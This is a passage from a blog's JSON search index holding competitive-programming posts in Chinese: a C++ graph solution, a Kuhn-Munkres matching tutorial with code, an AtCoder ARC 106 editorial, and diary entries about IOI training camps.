(f++ ? \u0026#34;, \u0026#34; : BEG) \u0026lt;\u0026lt; OUT; return O \u0026lt;\u0026lt; END; } DESTL(deque, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, x); DESTL(vector, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, x); DESTL(set, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, x); DESTL(multiset, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, x); DESTL(unordered_set, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, x); DESTL(map , \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, x.first \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; x.second); DESTL(unordered_map , \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, x.first \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; x.second); template \u0026lt;typename U, typename V\u0026gt; ost\u0026amp; operator\u0026lt;\u0026lt;(ost \u0026amp;O, std::pair\u0026lt;U,V\u0026gt; p) { return O \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p.first \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p.second \u0026lt;\u0026lt; \u0026#39;)\u0026#39;; } template \u0026lt;typename T, size_t N\u0026gt; ost\u0026amp; operator\u0026lt;\u0026lt;(ost \u0026amp;O, std::array\u0026lt;T,N\u0026gt; a) { int f=0; for(T x: a) O \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;[\u0026#34;) \u0026lt;\u0026lt; x; return O \u0026lt;\u0026lt; \u0026#34;]\u0026#34;; } template \u0026lt;typename T, size_t ...I\u0026gt; ost\u0026amp; prtuple(ost \u0026amp;O, T t, std::index_sequence\u0026lt;I...\u0026gt;) { return (..., (O \u0026lt;\u0026lt; (I ? \u0026#34;, \u0026#34; : \u0026#34;(\u0026#34;) \u0026lt;\u0026lt; std::get\u0026lt;I\u0026gt;(t))), O \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; } template \u0026lt;typename ...T\u0026gt; ost\u0026amp; operator\u0026lt;\u0026lt;(ost \u0026amp;O, std::tuple\u0026lt;T...\u0026gt; t) { return prtuple(O, t, std::make_index_sequence\u0026lt;sizeof...(T)\u0026gt;()); } template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); (std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34; , ... , (std::cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } #else #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(...) ((void)0) #define safe ((void)0) #endif // local #define all(v) begin(v),end(v) #define get_pos(v,x) int(lower_bound(begin(v),end(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mem(v,x) memset(v,x,sizeof v) using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-7; constexpr ll N = 85, INF = 1e18, MOD = 1000000007, K = 14699, inf = 1e9; constexpr inline ll cdiv(ll x, ll m) { return x/m + (x%m ? (x\u0026lt;0) ^ (m\u0026gt;0) : 0); } // ceiling divide constexpr inline ll modpow(ll e,ll p,ll m=MOD) { ll r=1; for(e%=m;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r; } int n, m; bool g[N][N]; int picked[N]; int deg[N]; int ans = inf; void pick(int x) { picked[x] = true; for(int i = 0; i \u0026lt; n; i++) if(g[x][i]) --deg[i]; } void unpick(int x) { picked[x] = false; for(int i = 0; i \u0026lt; n; i++) if(g[x][i]) ++deg[i]; } void dfs(int c = 0) { if(c \u0026gt; ans) return; // reduce vector\u0026lt;int\u0026gt; zero; for(int i = 0; i \u0026lt; n; i++) if(!picked[i] \u0026amp;\u0026amp; deg[i] == 0) zero.pb(i); if(zero.size()) { for(int x: zero) pick(x); dfs(c); for(int x: zero) unpick(x); return; } for(int i = 0; i \u0026lt; n; i++) if(!picked[i] \u0026amp;\u0026amp; deg[i] == 1) { for(int j = 0; j \u0026lt; n; j++) if(!picked[j] \u0026amp;\u0026amp; g[i][j]) { pick(i); pick(j); dfs(c+1); unpick(i); unpick(j); return; } } int mx = -1; for(int i = 0; i \u0026lt; n; i++) if(!picked[i]) { if(mx == -1 || deg[i] \u0026gt; deg[mx]) mx = i; } if(mx == -1) { ans = min(ans, c); return; } vector\u0026lt;int\u0026gt; adj; for(int i = 0; i \u0026lt; n; i++) if(!picked[i] \u0026amp;\u0026amp; g[mx][i]) adj.pb(i); pick(mx); dfs(c+1); for(int x: adj) pick(x); dfs(c+adj.size()); for(int x: adj) unpick(x); unpick(mx); } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for(int i = 0; i \u0026lt; m; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; g[a][b] = g[b][a] = true; ++deg[a], ++deg[b]; } dfs(); cout \u0026lt;\u0026lt; n - ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/11/22/TIOJ-1978/","tags":["TIOJ","graph","dfs"],"title":"TIOJ-1978"},{"contents":"我只是想做一下筆記\n然後我還是不會縮花/帶花樹演算法，所以我也不會一般圖最大權匹配\n先備知識 看得懂$\\sum$\n然後會(不帶權)二分圖匹配的匈牙利演算法\nKuhn Munkres 這裡介紹KM演算法，而若要求解二分圖上的最大權匹配等相關問題可以透過下面的演算法轉換成KM的模型。\nKM演算法是用來求一張完全二分圖的最大權完美匹配的演算法，其中邊的權重都是非負的。\n演算法轉換 最大權匹配 $\\to$ 最大權完全二分圖完美匹配(非負邊權)\n把不存在的邊以及負邊權的邊邊權設成0 最大權完美匹配(有負邊權) $\\to$ 最大權完全二分圖完美匹配(非負邊權)\n把不存在的邊邊權設成0，並且把剩下每條邊的邊權加上一個夠大的數$M$，這樣就會傾向於選出儘量多邊。最後的答案記得要扣掉這些$M$ 可以想想看為什麼上面兩種轉換是對的\n把問題敘述再好好的寫一遍\nDescription 給你一張完全二分圖 $K _ {n,n}$ ，每條邊 $e = (x_i,y_j)$ 有邊權 $w _ e$\n請選出 $n$ 條邊 $e_1, e_2, \\cdots e_n$ 兩兩不共端點，使得邊權和$\\sum\\limits _ {i=1}^n w _ {e _ i}$最大\n對偶問題 首先引入頂標的概念。對於每個頂點$v$我們維護一個數字$L_v$，稱為頂標。\n在演算法的過程中，我們必須妥當的維護頂標，使得對於所有邊$e=(a,b)$都有$L_a+L_b \\geq w_e$\n那麼很顯然的，對於任何一種合法的頂標來說，頂標的總和會大於等於最大權完美匹配的值。\n因為對於任何匹配$M$都有$\\sum\\limits _ {e\\in M} w_e \\leq \\sum\\limits _ {e\\in M, e = (a,b)} (L_a + L_b) \\leq \\sum\\limits _ {v\\in V} L_v$\n另外，對於一個合法的頂標配置$L$，考慮所有$L_a+L_b = w_e$的邊$e=(a,b)$所形成的子圖$G\u0026rsquo;$(我們稱這類$e$為等邊)\n若這個子圖有完美匹配的話那麼顯然：原圖最大權完美匹配 $=$ $G\u0026rsquo;$的最大權完美匹配 $=$ $\\sum _ {v\\in V} L _ v$\n事實上，我們可以得出更強的結論，即最大權完美匹配 $=$ 所有合法頂標配置中總和最小者，不過證明我不會\u0026gt; \u0026lt;\n演算法的步驟 KM演算法的(非常模糊的)步驟大致如下：\n依序以$x_1, x_2, \\dots, x_n$為起點尋找增廣路徑，但限制只能走等邊，即$e=(a,b)$滿足$L_a+L_b=w_e$ 如果找不到增廣路徑，我們就必須調整頂標，使得之前已經匹配好的邊仍然滿足等號，並且有機會在調整之後多出可以增廣的等邊 關於頂標的初始化以及如何調整頂標： 初始化：不失一般性一開始可以初始化$L _ {x_i} = \\max\\limits _ {x_i \\in e} w_e, L _ {y _ i} = 0$ 如何調整頂標：由於在前一步我們找增廣路徑失敗了，這表示我們找到的是一個交錯樹，樹上的邊都是等邊。我們考慮把所有在樹上的$x_i$或$y_j$，讓$L _ {x_i}$減少$\\delta$，$L _ {y_j}$增加$\\delta$。\n問題在於如何取這個$\\delta$。想要讓可以增廣的邊變多的話，肯定是多了連接樹上和非樹上的頂點的非等邊，我們取$\\delta$是所有這種非等邊$e=(a,b)$的$L _ a + L _ b - w_e$的最小值，這樣就能確定我們每次調整頂標都會至少多一條等邊(也至少多一個點跑到樹上！)，並且原有的等邊不會變少(如果你不確定可以看下面的圖想一下為什麼)。 注意到所謂樹上的點就是在 dfs 有走到的點owo\n扣得 以下是一個$\\mathcal{O}(n^4)$的版本。\n首先是宣告和建圖的部份。 g[a][b] 代表$e=(a,b)$的權重$w_e$； lx[i], ly[j] 分別代表$L _ {x_i}, L _ {y_i}$， visx, visy 是用在dfs的時候； match[j]=i 代表$y_j$跟$x_i$匹配了，如果沒人跟他匹配則是 -1 。\n1 2 3 4 5 6 7 8 9 10 11 12 const int N = 125, inf = 1e9; int g[N][N]; int lx[N], ly[N]; int visx[N], visy[N], match[N]; int n; void init(int _n) { n = _n; for(int i = 0; i \u0026lt; n; i++) for(int j = 0; j \u0026lt; n; j++) g[i][j] = 0; } void addEdge(int a, int b, int weight) { g[a][b] = max(g[a][b], weight); } 接下來是我們的主程式\n1 2 3 4 5 6 7 8 9 10 11 int solve() { for(int i = 0; i \u0026lt; n; i++) { lx[i] = ly[i] = 0; for(int j = 0; j \u0026lt; n; j++) lx[i] = max(lx[i], g[i][j]); } for(int i = 0; i \u0026lt; n; i++) match[i] = -1; for(int i = 0; i \u0026lt; n; i++) while(!augment(i)) relabel(); int ans = 0; for(int j = 0; j \u0026lt; n; j++) if(match[j] != -1) ans += g[match[j]][j]; return ans; } 大家應該很好奇 augment(i) 跟 relabel() 怎麼寫的吧！事實上 augment(i) 就只是初始化 vis 陣列並且 dfs 只走等邊找增廣路徑；而 relabel() 就是用剛剛提到的方法修改頂標。程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 bool dfs(int i) { if(visx[i]) return false; visx[i] = true; for(int j = 0; j \u0026lt; n; j++) if(!visy[j]) { int d = lx[i] + ly[j] - g[i][j]; if(d == 0) { visy[j] = true; if(match[j] == -1 || dfs(match[j])) { match[j] = i; return true; } } } return false; } bool augment(int x) { for(int i = 0; i \u0026lt; n; i++) visx[i] = visy[i] = false; return dfs(x); } void relabel() { int delta = inf; for(int i = 0; i \u0026lt; n; i++) if(visx[i]) { for(int j = 0; j \u0026lt; n; j++) if(!visy[j]) { delta = min(delta, lx[i] + ly[j] - g[i][j]); } } for(int i = 0; i \u0026lt; n; i++) if(visx[i]) lx[i] -= delta; for(int j = 0; j \u0026lt; n; j++) if(visy[j]) ly[j] += delta; } 時間複雜度 每次dfs並重新標號的時間是 $\\mathcal{O}(n^2)$ ，對於每個 $x_i$ ，最多就只要調整 $n$ 次頂標就能成功增廣，找到跟他配的 $y_j$ ，因為每次調整頂標都會至少多出一個 $y_j$ 和 $x_i$ 可以透過等邊連通。所以總時間複雜度是 $\\mathcal{O}(n^4)$ 。\nslack優化 這個演算法實際上可以簡單的優化到 $\\mathcal{O}(n^3)$ 。瓶頸在於 while(!augment(i)) relabel(); 這部份。\n對於每個沒有在交錯樹內的 $y_j$ ，我們維護一個變數 slack[j] ，維護 $\\min (L _ {x_i} + L _ {y_i} - w _ {(x_i, y_j)})$ ，其中 $x_i$ 必須在交錯樹上。這樣子每次 relabel() 要找 $\\delta$ 就只要花 $\\mathcal{O}(n)$ 了，但是如果仍然重設 vis 陣列每次從 $x_i$ dfs 那時間複雜度也沒變，畢竟 dfs 是 $\\mathcal{O}(V+E)$ 的事情。\n首先，注意到做完頂標的調整之後，樹上的點 slack 不會有變化；反之不在樹上的 $y_j$ 我們則可以知道他的 slack 減少了 $\\delta$ 。接著，假如調整完頂標之後找到了增廣路徑，路徑的端點會是不在交錯樹上的 $y _ j$ 並且 slack[j] 是0的形式，因此我們每次不應該重設 vis ，而是應該檢查是否有包含這些點的增廣路徑，或是讓交錯樹擴展。\n因為我們不重設 vis ，每個點最多被 dfs 一次，會跑滿他的 $n$ 個鄰居，所以在一個 $x_i$ 的phase當中 dfs 的總複雜度是 $\\mathcal{O}(n^2)$\n這邊附上一份可以AC TIOJ 1042的code。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int inf = 1e9; struct KuhnMunkres { int n; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g; vector\u0026lt;int\u0026gt; lx, ly, slack; vector\u0026lt;int\u0026gt; match, visx, visy; KuhnMunkres(int n) : n(n), g(n, vector\u0026lt;int\u0026gt;(n)), lx(n), ly(n), slack(n), match(n), visx(n), visy(n) {} vector\u0026lt;int\u0026gt; \u0026amp; operator[](int i) { return g[i]; } bool dfs(int i, bool aug) { // aug = true 表示要更新 match if(visx[i]) return false; visx[i] = true; for(int j = 0; j \u0026lt; n; j++) { if(visy[j]) continue; // 一邊擴增交錯樹、尋找增廣路徑 // 一邊更新slack：樹上的點跟樹外的點所造成的最小權重 int d = lx[i] + ly[j] - g[i][j]; if(d == 0) { visy[j] = true; if(match[j] == -1 || dfs(match[j], aug)) { if(aug) match[j] = i; return true; } } else { slack[j] = min(slack[j], d); } } return false; } bool augment() { // 回傳是否有增廣路 for(int j = 0; j \u0026lt; n; j++) if(!visy[j] \u0026amp;\u0026amp; slack[j] == 0) { visy[j] = true; if(match[j] == -1 || dfs(match[j], false)) { return true; } } return false; } void relabel() { int delta = inf; for(int j = 0; j \u0026lt; n; j++) if(!visy[j]) delta = min(delta, slack[j]); for(int i = 0; i \u0026lt; n; i++) if(visx[i]) lx[i] -= delta; for(int j = 0; j \u0026lt; n; j++) { if(visy[j]) ly[j] += delta; else slack[j] -= delta; } } int solve() { for(int i = 0; i \u0026lt; n; i++) { lx[i] = 0; for(int j = 0; j \u0026lt; n; j++) lx[i] = max(lx[i], g[i][j]); } fill(ly.begin(), ly.end(), 0); fill(match.begin(), match.end(), -1); for(int i = 0; i \u0026lt; n; i++) { // slack 在每一輪都要初始化 fill(slack.begin(), slack.end(), inf); fill(visx.begin(), visx.end(), false); fill(visy.begin(), visy.end(), false); if(dfs(i, true)) continue; // 重複調整頂標直到找到增廣路徑 while(!augment()) relabel(); fill(visx.begin(), visx.end(), false); fill(visy.begin(), visy.end(), false); dfs(i, true); } int ans = 0; for(int j = 0; j \u0026lt; n; j++) if(match[j] != -1) ans += g[match[j]][j]; return ans; } }; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; while(cin \u0026gt;\u0026gt; n \u0026amp;\u0026amp; n) { KuhnMunkres KM(n); for(int i = 0; i \u0026lt; n; i++) { for(int j = 0; j \u0026lt; n; j++) { int c; cin \u0026gt;\u0026gt; c; if(c \u0026gt; 0) KM[i][j] = c; } } cout \u0026lt;\u0026lt; KM.solve() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } 小結 這次的筆記問了好多人\u0026gt; \u0026lt;還借圖論的書來看，不過還是輸光光不會證明。\n參考了日月卦長的網站跟slide超級多，還有OI wiki之類的，我自己覺得他們的code都寫的好醜(X\n如果有什麼不清楚或是覺得哪裡有問題歡迎通知我。\n另外寫這份筆記的時候有想到有沒有像Hopcroft Karp一樣用BFS就能加速之類的，不過我猜應該是沒有\n","permalink":"https://omeletwithoutegg.github.io/2020/11/16/Maximum-Weight-Bipartite-Matching/","tags":["tutorial","template","graph","matching"],"title":"二分圖最大權匹配"},{"contents":"AtCoder Regular Contest 106 最近一直被ZCK推坑，vir了好幾場ARC\n然後打完AGC才發現自己rating太低unrated，爛死XD\n結果打完這場還是不到能夠rated的標準1200 QQ\n然後想說寫一下題解好了 :P\nA. 106 Statement 給你$N$，問你有沒有正整數$A,B$使得$3^A+5^B = N$，$N \\leq 10^{18}$\nSolution 因為$A,B$最多都是$\\log$量級的所以亂枚舉就好了\n基本上也不太會溢位\nAC CODE\nB. Values Statement 給你一張無向圖，還有每個點一開始寫的數字$a_i$\n每次可以把兩個相鄰的點$x,y$一個數字+1一個數字-1\n問你是否能讓最後第$i$個點寫的數字是$b_i$\n$1 \\leq N \\leq 2 \\times 10^5$\n$0 \\leq M \\leq 2 \\times 10^5$\n$-10^9 \\leq a_i, b_i \\leq 10^9$\nSolution 只要一個連通塊裡$a_i$的總和和$b_i$的總和相同就做的到\n於是用 dsu 維護總和\nAC CODE\nC. Solutions 一開始想說這題題敘很長先跑去做 pD\n結果是水題，不過還是WA慘QQ\nStatement 「給你$N$個線段，請選出最多條兩兩完全不相交的線段。。」\n現在有兩種演算法$A,B$分別嘗試解決上述問題：\n$A$演算法：按照右界由小到大排序，並按照順序考慮線段。如果現在考慮的線段不會和當前的解的任何一條相交，則將其加入當前的解中。輸出最後的解的大小 $B$演算法：按照左界由小到大排序，並按照順序考慮線段。如果現在考慮的線段不會和當前的解的任何一條相交，則將其加入當前的解中。輸出最後的解的大小 請構造一組輸出使得「$A$輸出的答案 - $B$輸出的答案 = $M$」\n注意你構造的線段端點必須是不大於$10^9$的正整數，而且全部相異\n$1 \\leq N \\leq 10^5$\n$-N \\leq M \\leq N$\nSolution 因為$A$演算法會是這個問題的最佳解，所以$M\u0026lt;0$是無解\n首先$B$演算法一定至少會拿一個線段，所以$M=N$一定無解\n$M=N-1$的話表示有一個拿所有線段的解，也就是所有線段都不相交，$B$會和$A$有同樣的輸出，也是無解\n對於$0 \\leq M \u0026lt; N-1$的case，先構造$N-1$條完全不相交的線段，接著考慮把剩下來的那條當作左界最小的，讓他和後面$N-1$個線段中的前$M+1$條相交，於是$A,B$演算法的輸出將會相差$M$\n我在賽中一開始沒注意到$N = 1$的case，特判$N = 1, M = 0$才AC QQ\nAC CODE\nD. Powers Statement 給你長度$N$的序列$A = (A_1,A_2,\\dots,A_N)$以及$K$\n對於所有$1\\leq X\\leq K$\n請輸出$\\left( \\sum\\limits _ {i=1}^{N-1}\\sum\\limits _ {j=i+1}^N (A_i + A_j) ^ X \\right) \\pmod{998244353}$\nSolution 煩躁推式子\n我不擅長QQ花好久\n首先$\\sum\\limits _ {i=1}^{N-1}\\sum\\limits _ {j=i+1}^N (A_i + A_j) ^ x = \\frac{1}{2}\\left(\\sum\\limits _ {i=1}^N\\sum\\limits _ {j=1}^N (A_i + A_j) ^ X - \\sum\\limits _ {i=1}^N (2A_i)^X \\right)$，先把$i \u0026lt; j$的條件拔掉\n然後發現\n$$\n\\sum _ {i=1}^N \\sum _ {j=1}^N (A_i + A_j)^X = \\sum _ {i=1}^N \\sum _ {j=1}^N \\sum _ {p=0}^X \\binom{X}{p} A_i^p A_j^{X-p} = \\sum _ {p=0}^X \\binom{X}{p} \\left( \\sum _ {i=1}^N A_i^p \\right) \\left( \\sum _ {i=1}^N A_i^{X-p} \\right)\n$$\n對於$0\\leq p\\leq K$預處理$\\sum\\limits _ {i=1}^N A_i^p$就能$K^2$算出來了，總時間複雜度是$\\mathcal{O}(NK+K^2)$\nAC CODE\n後面都是賽後才寫出來的題目QQ我就爛\nE. Medals 我覺得這題真的很有趣，沒寫出來好可惜\nStatement 有$N$個員工，以今天為基準，第$i$個員工會先工作$A_i$天，接著放假$A_i$天，又工作$A_i$天、放假$A_i$天，周而復始。\n每天會頒發一個獎牌給有來工作的其中一個員工。當然如果當天沒有員工來工作就不會頒發任何獎牌。\n現在想請問你，在最佳的情況下，最少要多少天，才能讓所有員工都得到至少$K$面獎牌？\n$1 \\leq N \\leq 18$\n$1 \\leq K \\leq 10^5$\n$1 \\leq A_i \\leq 10^5$\nSolution 最近才vir到一場需要Hall\u0026rsquo;s theorem的題目XD馬上就用到\n我的解是考慮對答案二分搜\n對於一個固定的天數$D$，想像一張有$D+NK$個頂點的二分圖，兩部份分別代表每一天以及每個人的$K$個獎牌，並且如果該天可以頒給那個人獎牌就連一條邊，那麼我們想要知道的就是是否有一個大小$NK$的匹配。\n假設$A$是$NK$個頂點中的一個subset，$\\Gamma(A)$是其鄰居，包含一些代表天數的頂點\n那麼，根據Hall\u0026rsquo;s theorem，有那樣的完美匹配若且唯若$\\forall A, |A| \\leq |\\Gamma(A)|$\n不失一般性只需要枚舉$2^N$種組合，因為代表同一個人的頂點選再多個都不會影響鄰居的集合\n接下來就是我因為不熟而沒在賽中寫完的部份QQ\n為了對於所有subset都確認不等式的條件，我們必須知道有多少天會影響到這個subset的點\n注意答案最多是$2K\\sum A_i$，因此可以預處理每天可以對應到的鄰居\n假設$Cnt_s$代表在$D$天內有多少天對應到$s$這個subset，以及$Day_s$代表有多少天會影響到$s$這個subset\n那麼\n$$\nDay_s = \\sum _ {t \\\u0026amp; s \\neq 0} Cnt_t\n$$\n用SOS DP或是被稱為Fast Zeta Transform的技巧可以在$\\mathcal{O}(N2^N)$的時間複雜度內計算。\n總時間複雜度是$\\mathcal{O}((C+N2^N)\\log C)$，其中$C = 2K\\sum A_i$。聽說$C$可以壓到$\\mathcal{O}(NK)$不過我不太會OAO\nAC CODE\nF. Figure Statement 有一個玩具有$N$個零件，還有$N-1$個連接部件\n第$i$個零件上面有$d_i$個孔\n每個孔只能和一個連接部件連接，每個連接部件可以透過孔連接兩個零件\n問你有多少不同的連接方式把所有零件組裝在一起。\n注意零件上面的孔是相異的，但是所有連接部件都是相同的。\n也就是說，兩種連接方式$T_1, T_2$相同，若且唯若所有在$T_1$中的連接部件$e_1$，在$T_2$中都有對應的$e_2$，兩端的零件編號以及孔編號完全相同。\nSolution 我們將會介紹一種方法計算完全圖的生成樹有幾種，並且仿照該方式計算此問題的答案。\n假設$N$個點的完全圖有$X$個生成樹。對於某個生成樹，可以任意定一個點當作根，並且把$N-1$個邊加上編號，這樣的方式總共有$X \\times N \\times (N-1)!$種。 用另一種觀點來看邊有標號的有根樹數量。每一步我們加上一條有向邊，考慮加邊加到現在的生成森林，這一步加上去的有向邊的起點可以是任何一個點，但是終點必須是某個連通塊的根，而且不能是同一個連通塊。也就是說，在第$i$輪有$N \\times (N-i)$種選擇，因為除了自己以外的連通塊有$N-i$個。於是總方法數是$\\prod\\limits _ {i=1}^{N-1} N (N-i) = N^{N-1} (N-1)!$ $X \\times N \\times (N-1)! = N^{N-1} (N-1)! \\Rightarrow X = N^{N-2}$ 同樣地，我們先假設本題的答案是$X$，並且令$S = \\sum d _ i$\n考慮某種連接零件的方式，並且把$N-1$個邊加上編號，這樣的方式總共有$X \\times (N-1)!$種。 首先，先在每個零件選擇一個特殊孔，大致上是負責當作那個點和他的父節點連接的孔。在前$N-2$步，我們每次加上一條邊，其中一個端點可以是任何還沒用過的孔，但是不能是特殊孔；而另一個點必須是某個連通塊的根的特殊孔。這樣在第$i$輪有$(S - N - i + 1) \\cdot (N - i)$種方法。最後一步，剩下兩個連通塊，我們把他們的特殊孔連在一起。這樣有$\\prod\\limits d _ i \\cdot \\prod\\limits _ {i=1}^{N-2} (S - N - i + 1) (N - i)$種方法。 故 $X = \\prod\\limits d_i \\prod\\limits _ {i=0}^{N-3} (S - N - i)$ 這題是我跑去找別人的解QQ\n我看了好多解，好像都有用到Cayley定理甚至生成函數之類的QAQ好噁心\n找了好久最後看到官方youtube的講解才聽懂\nAC CODE\n總結 這次有點可惜沒做出E QQ\n然後看別人blog的時候驚訝他怎麼那麼厲害orz\n希望某次有機會破台ARC\n","permalink":"https://omeletwithoutegg.github.io/2020/10/26/ARC-106/","tags":["AtCoder","math","graph"],"title":"ARC-106"},{"contents":"好久又沒有發文了\n來講講上一次發文之後我都在做什麼好了\nBefore IOI 首先在8/17開始所謂的賽前集訓\n總共為期三周，分別在台南、新竹和台北\n在台南的前幾天是一個奇怪的教授要我們寫爛題目\n還得用PC2 judge，不過我們最後都變成在玩python in one line了\n之後他又講了有關點連通、邊連通跟degree之類的關係\n後來吳邦一教授來講課，他講了一些IOI的題目還有一些常見的trick，例如四邊形之類的\n那時候就能看出來我超爛(((\n週末是在師大上王柄豐的課\n這時似乎已經累計很多他丟的題目沒寫了QQ\n下一個禮拜是在清大和交大\n第一天韓永楷教授早上早上上的有點基礎，不過下午上的東西還蠻有趣的\n另外有遇到吳宗達跟盧可瑜(?) 還聽到了奇怪的洋蔥式資料結構\n第二天是蔡孟宗教授講parametric search跟matroid之類的東西\n雖然matroid和submodular的東西我是幾乎聽不懂，不過我覺得這天的課都還算是有趣\n第三天是蔡錫鈞教授，我一開始感覺他不是很友善，然後外加上我超想睡，而且其實頗難的，課聽進去的沒有多少QQ\n下午的時候謝旻錚教授找了hank來跟我們virtual IOI2017\n想當然而我被打爆，而且AY還贏了hank，超強orzzzz\n晚上被教授請客XD不過餐廳有點太高級不敢吃什麼東西\n周五的時候謝旻錚教授講了一些計算幾何的東西，感覺只要提到簡單多邊形就是超級噁心的@@\n回到台北之後都是王柄豐的課了\n終於聽到了toptree，不過還沒有實作過QQ\n然後也把之前ICPC的題目程式碼給補了一點點\n啊IOI也vir了幾場 可是總感覺沒有胸有成竹的感覺\n只能說IOI比成這樣真的是自己練習不足啊\n在集訓完到IOI這中間有空一個禮拜，而且還是在開學期間，實在有夠尷尬\n總之我把他當成有公假，而我們的校內賽初賽也是在這個禮拜，正好可以回去確認狀況以及去校內培訓玩玩(?)\n話說我們這屆的人能出校內賽其實算神奇\n原因是因為我們幾個有進過全國賽不會在北市賽佔到建中的名額，所以老師就找我們來出題目\n雖然我們出的題目好像沒有說很好QQ\n不過初賽感覺問題比較像是當天流程沒有仔細check好QQ\nAfter IOI 回到教室有種更尷尬的感覺\n不過總之周一下午跟著蕭梓宏他們跑去台大上了微積分一\n前面幾堂講的實在好基礎(#)\n另外我周三和周五的早上有去旁聽線性代數\n上了幾天的課之後\n我發現我就算沒去台大修課，大家也剛好會去，因為班上沒人自然就沒辦法上課\n再加上我也沒有修這學期的數理課程，事實上我幾乎沒有課需要上啊OAO\n要擔心的只有國文/英文/藝術與生活/體育，我覺得英文應該是最佳選擇\n我上微積分的第二個禮拜就開始感覺困難了orz\n總之希望是可以好好修完\n校內賽複賽變成是有點尷尬，因為我們流程是我們出題、老師選題，啊又剛好沒選到太多水題或是學長的題目QQ\n我覺得我應該當初直接寫出來說推薦可以直接選哪些題\n而且老實說也應該出幾題培訓有講過的東西，自己的盲點真的自己看不到@@\n大家當天的分數普遍都很低\n不過至少最後預期會進的人大部份都進了，還算是幸運\n在中秋連假的時候我買了一把新鍵盤，是ducky one的60%紅軸，用起來真的只能說超爽的wwww紅軸軟又軟，啊鍵位也都整個習慣了之後小巧的它就很有魅力wwww\n現在我的書包裡面除了筆電跟軟軟以外還多了鍵盤這個常駐物品\nEsc離手指超近而且方向鍵又被拔掉超爽的XDDDD\n可是有一個重大問題是用注音打字的時候我習慣按方向鍵XDD 所以還是得跑去弄組合鍵\n總之，希望我以後還能夠常常用到這把鍵盤，還有希望他能陪我很久\n","permalink":"https://omeletwithoutegg.github.io/2020/10/06/after-IOI/","tags":["experience"],"title":"Recent"},{"contents":"國培第二周 原本的課是在周六和周日的上午\n似乎因為需要電力檢修還是什麼的都被移到周日了\n週日 上課的教授是王柄豐，他都會先丟給我們一些題目然後過幾個小時再來叫我們上台\n原本是兩天各三題ICPC final的題目，不過全都被移到周日總共是六題\n我也忘記他丟哪些題目了，不過我記得我早上上去講一個rerooting+分塊凸包優化的算法之後就被重剖作法電爆了QQ\n下午我找到一題最短路去講，後來以為只會經過一條邊不用跑最短路，結果被教授抓到假解XD不過只要跑最短路應該是對的\n教授也跟我們說，上他的課想到一個做法不一定要急著實作出來，只要把想法確認好就好\n花了整個早上實作分塊凸包優化的我直接中槍QQ\nEND 中午第一次在國培吃便當XDD 好油(?)\n之前都是吃拉麵(#\n另外我們這禮拜有配飯吃看動畫，油上加油呢\n看了RE:0、魔王什麼的、史萊姆，還有格里爾的賢者時間XD，超污\n晚上跑去吃山嵐，第一次點赤湯，沒想到意外的不那麼辣，看起來明明是全紅的www\n然後東東曹宸睿好像要趕去報到AIS3就散會ㄌ\n","permalink":"https://omeletwithoutegg.github.io/2020/08/05/TOI-2020-7-26-weekend/","tags":null,"title":"國培 week 2"},{"contents":"國培第一週 週五 